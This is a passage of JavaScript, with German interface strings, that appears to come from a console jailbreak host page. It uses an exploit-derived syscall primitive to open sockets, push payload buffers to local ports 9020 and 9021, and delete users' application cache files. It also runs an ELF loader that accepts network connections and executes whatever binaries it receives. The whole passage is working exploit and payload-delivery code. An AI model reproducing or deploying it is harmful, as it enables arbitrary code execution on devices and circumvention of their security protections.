            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-wal`);
            await log(`Appcache für Benutzer-ID '${user_id}' entfernt.`);
        }
        if (user_ids.length > 1) {await log(`Appcache für alle ${user_ids.length} Benutzer entfernt.`);}
    }

    async function send_buffer_to_port(buffer, size, port) {
        let sock = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (sock <= 0) {throw new Error("Socket-Fehler");}
        build_addr(p, send_buffer_to_port.sock_addr_store, AF_INET, htons(port), 0x0100007F);
        let connect_res = (await chain.syscall(SYS_CONNECT, sock, send_buffer_to_port.sock_addr_store, 0x10)).low << 0;
        if (connect_res < 0) {
            await chain.syscall(SYS_CLOSE, sock);
            throw new Error("Verbindungsfehler zu Port " + port);
        }
        let bytes_sent = 0;
        let write_ptr = buffer.add32(0x0);
        while (bytes_sent < size) {
            let send_res = (await chain.syscall(SYS_WRITE, sock, write_ptr, size - bytes_sent)).low << 0;
            if (send_res <= 0) {
                await chain.syscall(SYS_CLOSE, sock);
                throw new Error("Buffer-Fehler zu Port " + port);
            }
            bytes_sent += send_res;
            write_ptr.add32inplace(send_res);
        }
        await chain.syscall(SYS_CLOSE, sock);
    }
    send_buffer_to_port.sock_addr_store = p.malloc(0x10, 1);
    sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);
    let ports = wkOnly ? "" : "9020";
    if (is_elfldr_running) {if (ports) {ports += ", ";} ports += "9021";}
    document.getElementById('top-bar-text').innerHTML = `IP: <span class="fw-bold">${ip.ip}</span> Port: ${ports} (${ip.name})`;
    /** @type {Array<{payload_info: PayloadInfo, toast: HTMLElement}>} */
    let queue = [];
    window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
        /** @type {PayloadInfo} */
        let payload_info = event.detail;
        let toast = showToast(`${payload_info.displayTitle}: In Warteschlange...`, -1);
        queue.push({ payload_info, toast });
    });
    await new Promise(resolve => setTimeout(resolve, 300));
    await switchPage("payloads-view");
    while (true) {
        if (queue.length > 0) {
            let { payload_info, toast } = /** @type {{payload_info: PayloadInfo, toast: HTMLElement}} */ (queue.shift());
            try {
                if (payload_info.customAction) {
                    if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {await delete_appcache(updateToastMessage.bind(null, toast));}
                    else {throw new Error(`Unbekannter Prozess: ${payload_info.customAction}`);}
                } else {
                    updateToastMessage(toast, `${payload_info.displayTitle}: Lade...`);
                    let total_sz = await load_payload_into_elf_store_from_local_file(payload_info.fileName);
                    if (!payload_info.toPort) {
                        if (wkOnly) {throw new Error();}
                        updateToastMessage(toast, `${payload_info.displayTitle}: Parse...`);
                        await parse_elf_store(total_sz);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload aktiv...`);
                        await execute_elf_store();
                        let out = await wait_for_elf_to_exit();
                        if (out !== 0) {throw new Error('Payload-Fehler: 0x' + out.toString(16));}
                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload geladen`);
                    } else {
                        updateToastMessage(toast, `${payload_info.displayTitle}: sende an Port ${payload_info.toPort}...`);
                        await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
                        updateToastMessage(toast, `${payload_info.displayTitle}: gesendet an Port ${payload_info.toPort}`);
                    }
                }
            } catch (error) {
                updateToastMessage(toast, `${payload_info.displayTitle}: Fehler: ${error}`);
                setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
                continue;
            }
            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        }
        if (queue.length > 0) {continue;}
        if (wkOnly) {await new Promise(resolve => setTimeout(resolve, 50));continue;}
        select_readfds.backing.fill(0);
        select_readfds.backing[elf_loader_socket_fd >> 3] |= 1 << (elf_loader_socket_fd & 7);
        let select_res = (await chain.syscall(SYS_SELECT, elf_loader_socket_fd + 1, select_readfds, 0, 0, timeout)).low << 0;
        if (select_res < 0) {throw new Error("Auswahl-Fehler");}
        else if (select_res === 0) {continue;}
        let conn_fd = (await chain.syscall(SYS_ACCEPT, elf_loader_socket_fd, conn_addr_store, conn_addr_size_store)).low << 0;
        if (conn_fd < 0) {throw new Error("Verbindungs-Fehler");}
        let toast = showToast("ELF Loader: Got a connection, reading...", -1);
        try {
            let write_ptr = elf_store.add32(0x0);
            let total_sz = 0;
            while (total_sz < elf_store_size) {
                let read_res = (await chain.syscall(SYS_READ, conn_fd, write_ptr, elf_store_size - total_sz)).low << 0;
                if (read_res <= 0) {break;}
                write_ptr.add32inplace(read_res);
                total_sz += read_res;
            }
            updateToastMessage(toast, "ELF-Loader: Parsing ELF...");
            await parse_elf_store(total_sz);
            updateToastMessage(toast, "ELF-Loader: Executing ELF...");
            await execute_elf_store();
            let out = await wait_for_elf_to_exit();
            if (out !== 0) {throw new Error('ELF-Loader Fehler: 0x' + out.toString(16));}
            updateToastMessage(toast, "ELF-Loader Fehler");
            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        } catch (error) {
            updateToastMessage(toast, `ELF-Loader Fehler: ${error}`);
            setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
        } finally {await chain.syscall(SYS_CLOSE, conn_fd);}
    }

}

let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `offsets/${window.fw_str}.js`);